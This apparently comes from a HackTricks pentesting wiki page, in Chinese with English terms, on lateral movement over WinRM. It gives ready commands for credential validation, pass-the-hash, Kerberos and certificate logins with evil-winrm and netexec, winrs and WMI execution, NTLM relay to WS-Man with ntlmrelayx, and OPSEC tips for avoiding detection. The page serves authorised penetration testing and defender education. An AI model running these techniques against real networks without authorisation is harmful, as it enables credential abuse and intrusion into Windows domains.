# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM 是 Windows 环境中最方便的 **lateral movement** 传输方式之一，因为它可以通过 **WS-Man/HTTP(S)** 提供远程 shell，而不需要 SMB service creation tricks。 如果目标暴露了 **5985/5986**，并且你的 principal 被允许使用 remoting，你通常可以很快从“valid creds”切换到“interactive shell”。

关于 **protocol/service enumeration**、listeners、启用 WinRM、`Invoke-Command` 以及通用 client 用法，请查看：

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- 使用 **HTTP/HTTPS** 而不是 SMB/RPC，因此在 PsExec-style execution 被阻止的地方，它通常仍然可用。
- 使用 **Kerberos** 时，它不会向目标发送可复用的 credentials。
- 可从 **Windows**、**Linux** 和 **Python** tooling（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）中干净地工作。
- 交互式 PowerShell remoting 路径会在目标上以已认证用户上下文启动 **`wsmprovhost.exe`**，这在操作上不同于基于 service 的 exec。

## Access model and prerequisites

在实践中，成功的 WinRM lateral movement 依赖于 **三** 件事：

1. 目标有一个 **WinRM listener**（`5985`/`5986`）并且 firewall rules 允许访问。
2. 该 account 可以对该 endpoint 进行 **authenticate**。
3. 该 account 被允许 **open a remoting session**。

获得这种访问权限的常见方式：

- 目标上的 **Local Administrator**。
- 在较新的系统上属于 **Remote Management Users**，或者在仍然认可该组的系统/components 上属于 **WinRMRemoteWMIUsers__**。
- 通过 local security descriptors / PowerShell remoting ACL changes 委派的显式 remoting rights。

如果你已经控制了一台具有 admin rights 的主机，记住你也可以使用这里描述的 techniques，**在不拥有完整 admin group membership 的情况下委派 WinRM access**：

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**。如果你通过 IP 连接，client 通常会回退到 **NTLM/Negotiate**。
- 在 **workgroup** 或跨 trust 的边缘场景中，NTLM 通常需要 **HTTPS**，或者将 target 添加到 client 上的 **TrustedHosts**。
- 使用 **local accounts** 通过 Negotiate 在 workgroup 中连接时，UAC remote restrictions 可能会阻止访问，除非使用内置的 Administrator account 或设置 `LocalAccountTokenFilterPolicy=1`。
- PowerShell remoting 默认使用 **`HTTP/<host>` SPN**。在某些环境中，如果 `HTTP/<host>` 已经被注册给其他 service account，WinRM Kerberos 可能会以 `0x80090322` 失败；此时可以使用带端口的 SPN，或者切换到存在该 SPN 的 **`WSMAN/<host>`**。

如果你在 password spraying 时拿到了 valid credentials，那么通过 WinRM 验证它们通常是最快判断它们是否能转成 shell 的方式：

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM 用于交互式 shell

`evil-winrm` 仍然是从 Linux 进行交互的最方便选项，因为它支持 **passwords**、**NT hashes**、**Kerberos tickets**、**client certificates**、文件传输，以及内存中 PowerShell/.NET 加载。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN 边缘情况：`HTTP` vs `WSMAN`

当默认的 **`HTTP/<host>`** SPN 导致 Kerberos 失败时，尝试改为请求/使用 **`WSMAN/<host>`** ticket。这种情况会出现在加固过或比较特殊的企业环境中，此时 `HTTP/<host>` 已经绑定到另一个 service account。
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
这在 **RBCD / S4U** abuse 之后也很有用，尤其是当你专门伪造或请求了一个 **WSMAN** service ticket，而不是通用的 `HTTP` ticket 时。

### 基于证书的身份验证

WinRM 也支持 **client certificate authentication**，但证书必须在目标上映射到一个 **local account**。从 offensive 角度看，这在以下情况很重要：

- 你已经窃取/导出了一个已映射到 WinRM 的有效 client certificate 和 private key；
- 你利用了 **AD CS / Pass-the-Certificate** 为某个 principal 获取证书，然后切换到另一条身份验证路径；
- 你在刻意避免使用基于密码的远程管理的环境中操作。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM 比 password/hash/Kerberos auth 少见得多，但当它存在时，可以提供一条**passwordless lateral movement**路径，而且即使 password rotation 也能持续有效。

### Python / automation with `pypsrp`

如果你需要 automation 而不是 operator shell，`pypsrp` 可以让你从 Python 使用 WinRM/PSRP，并支持 **NTLM**、**certificate auth**、**Kerberos** 和 **CredSSP**。
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows 原生 WinRM 横向移动

### `winrs.exe`

`winrs.exe` 是内置的，当你想要**原生 WinRM 命令执行**而不打开交互式 PowerShell remoting session 时很有用：
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
在操作上，`winrs.exe` 通常会导致类似以下的远程进程链：
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
记住这一点很重要，因为它不同于基于 service 的 exec，也不同于交互式 PSRP sessions。

### `winrm.cmd` / 使用 WS-Man COM 而不是 PowerShell remoting

你也可以通过 **WinRM transport** 执行，而无需 `Enter-PSSession`，方法是通过 WS-Man 调用 WMI classes。这样 transport 仍然是 WinRM，但远程执行原语变成了 **WMI `Win32_Process.Create`**：
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
当以下情况时，这种方法很有用：

- PowerShell logging 被高度监控。
- 你想要 **WinRM transport**，但不想要经典的 PS remoting 工作流。
- 你正在围绕 **`WSMan.Automation`** COM object 构建或使用自定义 tooling。

## NTLM relay to WinRM (WS-Man)

当 SMB relay 因为 signing 被阻止，且 LDAP relay 受到限制时，**WS-Man/WinRM** 仍然可能是一个有吸引力的 relay target。现代的 `ntlmrelayx.py` 包含 **WinRM relay servers**，并且可以 relay 到 **`wsman://`** 或 **`winrms://`** targets。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
两个实用说明：

- Relay 在目标接受 **NTLM** 且被中继的主体被允许使用 WinRM 时最有用。
- 最近的 Impacket 代码专门处理 **`WSMANIDENTIFY: unauthenticated`** 请求，因此 `Test-WSMan` 风格的探测不会破坏 relay 流程。

关于落地第一个 WinRM 会话后的多跳限制，请查看：

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 和检测说明

- **交互式 PowerShell remoting** 通常会在目标上创建 **`wsmprovhost.exe`**。
- **`winrs.exe`** 通常会创建 **`winrshost.exe`**，然后再启动请求的子进程。
- 如果你使用 PSRP 而不是原始 `cmd.exe`，要预期会有 **network logon** 遥测、WinRM 服务事件，以及 PowerShell operational/script-block logging。
- 如果你只需要执行单个命令，`winrs.exe` 或一次性 WinRM 执行可能比长期存在的交互式 remoting 会话更安静。
- 如果 Kerberos 可用，优先使用 **FQDN + Kerberos**，而不是 IP + NTLM，以减少信任问题以及客户端侧 `TrustedHosts` 的麻烦改动。

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
